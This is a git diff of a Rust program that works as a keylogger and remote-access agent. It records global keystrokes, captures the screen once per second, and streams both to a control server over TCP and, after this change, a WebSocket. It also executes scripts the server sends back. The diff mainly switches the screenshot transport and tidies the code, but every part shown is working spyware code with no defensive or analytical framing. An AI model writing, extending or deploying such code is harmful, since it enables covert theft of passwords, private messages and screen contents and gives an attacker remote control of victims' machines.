@@ -3,11 +3,17 @@ use tokio::sync::mpsc;
 use tokio::sync::mpsc::{Sender, Receiver};
 use tokio::net::TcpStream;
 use tokio::time::Duration;
+use tokio_tungstenite::{connect_async, tungstenite::protocol::Message, WebSocketStream};
 
-use scrap::{Capturer, Display};
+use futures_util::stream::SplitSink;
+use futures_util::{SinkExt, StreamExt};
+
 use image::ExtendedColorType;
 use image::codecs::jpeg::JpegEncoder;
+
+use scrap::{Capturer, Display};
 use rdev::{Event, listen};
+use bytes::Bytes;
 
 use std::io::ErrorKind::WouldBlock;
 use std::thread;
@@ -16,34 +22,52 @@ use std::process::Command;
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
 
+const FPS: f32 = 1.0;
+
 #[tokio::main]
 async fn main() -> io::Result<()> {
-    let socket_txt = TcpStream::connect("127.0.0.1:7878").await?;
-    let socket_img = TcpStream::connect("127.0.0.1:7879").await?;
+    let tcpsocket = TcpStream::connect("127.0.0.1:7878").await?;
+    let (websocket, _) = 
+        connect_async("ws://127.0.0.1:8080/ws").await.expect("failed to connect");
 
-    let (rd_txt, wr_txt) = io::split(socket_txt);
-    let (_, wr_img) = io::split(socket_img); 
+    let (rd_txt, wr_txt) = io::split(tcpsocket);
+    let (write, _) = websocket.split(); 
 
     let (tx1, rx1) = mpsc::channel::<String>(16);
     let (tx2, rx2) = mpsc::channel::<Vec<u8>>(32);
 
-    let worker_a = tokio::spawn(async move {
-        read_keystrokes(tx1)
-    });
-    let worker_b = tokio::spawn(async move {
-        send_keystrokes(rx1, wr_txt).await
-    });
-    let worker_c = tokio::spawn(async move {
-        take_screenshot(tx2).await
-    });
-    let workder_d = tokio::spawn(async move {
-        send_screenshot(rx2, wr_img).await
-    });
-    let worker_f = tokio::spawn(async move {
-        exec_script(rd_txt).await
-    });
+    let worker_a = 
+        tokio::spawn(async move {
+            read_keystrokes(tx1)
+        });
+        
+    let worker_b = 
+        tokio::spawn(async move {
+            send_keystrokes(rx1, wr_txt).await
+        });
 
-    let _ = tokio::try_join!(worker_a, worker_b, worker_c, workder_d, worker_f);
+    let worker_c = 
+        tokio::spawn(async move {
+            take_screenshot(tx2).await
+        });
+
+    let workder_d = 
+        tokio::spawn(async move {
+            send_screenshot(rx2, write).await
+        });
+
+    let worker_f = 
+        tokio::spawn(async move {
+            exec_script(rd_txt).await
+        });
+
+    let _ = tokio::try_join!(
+        worker_a, 
+        worker_b, 
+        worker_c, 
+        workder_d, 
+        worker_f,
+    );
 
     Ok(())
 }
@@ -73,7 +97,7 @@ async fn send_keystrokes(mut rx: Receiver<String>, mut wr: WriteHalf<TcpStream>)
 }
 
 async fn take_screenshot(tx: Sender<Vec<u8>>) -> io::Result<()> {
-    let frame_duration = Duration::from_secs_f32(1.0);
+    let frame_duration = Duration::from_secs_f32(FPS);
 
     tokio::task::spawn_blocking(move || {
         let display = Display::primary()?;
@@ -111,13 +135,7 @@ async fn take_screenshot(tx: Sender<Vec<u8>>) -> io::Result<()> {
                 .encode(&rgb, w as u32, h as u32, ExtendedColorType::Rgb8)
                 .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
 
-            let bytes_len = (bytes.len() as u32).to_be_bytes();
-
-            let mut packet = Vec::new();
-            packet.extend_from_slice(&bytes_len);
-            packet.extend_from_slice(&bytes);
-
-            if tx.blocking_send(packet).is_err() {
+            if tx.blocking_send(bytes).is_err() {
                 break;
             }
 
@@ -132,9 +150,14 @@ async fn take_screenshot(tx: Sender<Vec<u8>>) -> io::Result<()> {
     Ok(())
 }
 
-async fn send_screenshot(mut rx: Receiver<Vec<u8>>, mut wr: WriteHalf<TcpStream>) -> io::Result<()> {
+async fn send_screenshot(
+    mut rx: Receiver<Vec<u8>>, 
+    mut wr: SplitSink<WebSocketStream<tokio_tungstenite::MaybeTlsStream<TcpStream>>, Message>
+) -> io::Result<()> {
     while let Some(data) = rx.recv().await {
-        wr.write_all(data.as_slice()).await?;
+        if wr.send(Message::Binary(Bytes::from(data))).await.is_err() {
+            break;
+        }
     }
     Ok(())
 }
